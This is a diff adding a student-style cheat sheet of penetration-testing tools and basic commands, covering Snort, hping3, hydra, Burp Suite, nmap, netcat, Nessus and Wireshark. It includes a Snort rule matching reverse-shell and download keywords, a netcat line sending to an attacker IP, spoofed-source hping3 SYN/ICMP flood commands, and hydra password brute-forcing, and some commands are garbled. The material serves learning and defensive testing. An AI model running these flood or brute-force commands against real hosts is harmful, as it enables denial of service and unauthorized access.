@@ -1,0 +1,82 @@
+	Penetration Testing tools and basic commands
+
+	Snort
+Tool used to detect DOS attacks.
+start- sudo snort -A console -c /etc/snort/snort.conf
+test- sudo snort -T -c /etc/snort/snort.conf
+alter rules- cd /etc/snort/rules/local.rules
+rules-
+alert icmp any any -> $HOME_NET any(msg:"icmp";sid:10000001;rev:1)
+alert tcp any any -> $HOME_NET 21(msg:"tcp";sid:100001;rev:1)
+-A=activate,-T=test,-c=config
+alert tcp any any -> $HOME_NET any(msg:"reverse shell,backdoor,suspicious exe,curl,wget,metspreter or HTTP execution has taken place";content:"nc /bin/bash wget curl .exe metapreter";nocase;sid:3000001;rev:1)
+Here content-used to scan for specific kind of content and nocase means it is not case sensitive.
+in the victim system run below command to trigger the rule
+echo "nc /bin/bash wget curl .exe metapreter" | nc <attacker ip> <port>
+
+	hping3
+Tool used to send multiple syn packets and icmp packets for a DOS attack.
+
+sudo hping3 -1 -c 100 -i 5 <ip>
+sudo hping -1 -c 100 --faster <ip>
+sudo hping -1 -a <fake ip> <ip>
+sudo hping -1 --rand-source <ip>
+syn packets for dos
+sudo hping -S -c 1000 -p 80 <ip>
+sudo hping -S --flood -p 80 <ip>
+-S=syn, -1=icmp, -c=count, -a=alternate -p=port
+
+	hydra
+Tool used for brute force the password of a system
+hydra -l msfadmin -p /opt/metasploit framework/embedded/framework/data/wordlist/unix_passwords.txt ftp://<msf-ip>
+ftp <msf>
+get filename.txt #gets stuff from normal system
+ssh -o HostKeyAlgorithms =+ ssh-rsa,ssh-dss msfadmin@<ip> #ssh connection
+gets the password -l=lowercase -p=path
+
+	burpsuite
+Burpsuite is a tool which intercepts the packets sent outside the system and it can be manuplated
+In firefox->settings->proxy->manual set 127.0.0.1 and port 8080.
+Go to http://burp->download the certificate
+In firefox->settings->certificates->view certificates->authorization->input->(it will ask for certificate, choose the cert from the downloads)
+Go to burpsuite click on proxy->intersept, and now u can intersept the packets sent.
+Turn on the intersept before u send anything.
+
+	Cryptool
+This is an application which is used to encrypt and decrypt text, it has many other options and functionalities which u can explore.
+
+	Nmap
+nmap(network mapper) is used to scan various IP addresses or a single ip addresses.
+nmap ip
+nmap -v ip
+nmap -V ip
+nmap -A ip
+nmap -cA ip
+nmap --open ip
+nmap -p 80 ip
+nmap ip/24 --exclude ip
+nmap -O -v ip
+nmap -sV ip
+nmap -O ip
+nmap -sS ip
+nmap -sT ip
+nmap -sU ip
+nmap -sN ip
+nmap -sF ip
+nmap --send-ip ip
+nmap --send-eth ip
+
+	netcat
+netcat is used to monitor the network activity in the system on a specific port.
+nc -lvnp 80
+
+	nessus
+It is a tool for cybersecurity which does different types of attacks to a host system, to check for its security level. 
+You need to download nessus 
+sudo systemctl start nessus.service
+go to the link
+click on any type of scan and it will generate a report.
+
+	Wireshark
+It is like netcat but with gui and filters, it is used to capture packets. If the packet is not encrypted it can even display it.
+	
